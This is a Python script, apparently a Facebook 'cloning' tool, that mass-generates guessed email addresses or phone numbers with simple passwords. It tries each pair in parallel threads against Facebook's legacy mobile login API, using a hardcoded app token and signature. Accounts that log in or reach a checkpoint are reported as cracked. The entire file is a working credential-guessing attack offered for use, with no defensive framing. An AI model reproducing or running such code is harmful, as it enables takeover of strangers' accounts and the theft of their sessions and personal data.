#Code By Syam

import requests,random,time,re,base64,concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()



logo = """
 \x1b[1;97m _______           _______  _______ 
 \x1b[1;97m(  ____ \|\     /|(  ___  )(       )
 \x1b[1;97m| (    \/( \   / )| (   ) || () () |
 \x1b[1;97m| (_____  \ (_) / | (___) || || || |
 \x1b[1;97m(_____  )  \   /  |  ___  || |(_)| |
 \x1b[1;97m      ) |   ) (   | (   ) || |   | |
 \x1b[1;97m/\____) |   | |   | )   ( || )   ( |
 \x1b[1;97m\_______)   \_/   |/     \||/     \|  
 \x1b[1;97m                        \033[0;91m Version : 1.0
 \x1b[1;97m---------------------------------------------------
 \33[1;41m Tool Created by SYAM SHAH \33[0m 
 \x1b[1;97m---------------------------------------------------
 \x1b[1;97m[+] Author    :  SYAM SHAH
 \x1b[1;97m[+] Facebook  :  SYAM
 \x1b[1;97m[+] github    :  SYAM-SH4H
 \x1b[1;97m---------------------------------------------------
"""

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day


## MAIN MENU ##
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		#os.system("clear")
		print(logo)
		print("\n [1] Email Cloning")
		print(" [2] Number Cloning")
		print(" [3] Exit ")
		SYAM=input(" Choose : ")
		if SYAM in ["1", "01"]:
			random_email()
		if SYAM in ["2", "02"]:
			random_numbers()
		if SYAM in ["3", "03"]:
			exit()
		else:
			print (" Wrong Select ")
			time.sleep(1)
			Main()

def random_email():
	data = []
	name=input("Example : Adilkhan, Adilali, Adil123 \nTarget Name : ")
	domain=input( " Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
	list={
	'g':'@gmail.com',
	'y':'@yahoo.com', 
	'h':'@hotmail.com'
	}
	if not domain in ['g','y','h']:
		print ( " Fill In The Correct")
		random_email()
	a=int(input("Type 1000 To 50000 \n Amount : "))
	setpw=input( " Set Password : ").split(',')
	print( " Crack Started, Please Wait...\n")
	[data.append({'user': name+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,a+1)]
	with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
		{th.submit(brute, user['user'], user['pw']): user for user in data}
		input( "Back")
		Main()
		
def random_numbers():
  print (logo)
  data = []
  print(" Number Must Be 5 Digit")
  print(" Example : 92307")
  code=str(input(" Input Number : "))
  if len(code) > 5:
  	print( " Number Must Be 5 Digit")
  time.sleep(1)
  random_numbers()
  a=int(input(" Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(a)]]
  print( " Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("Back")
  Main()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass
Main()
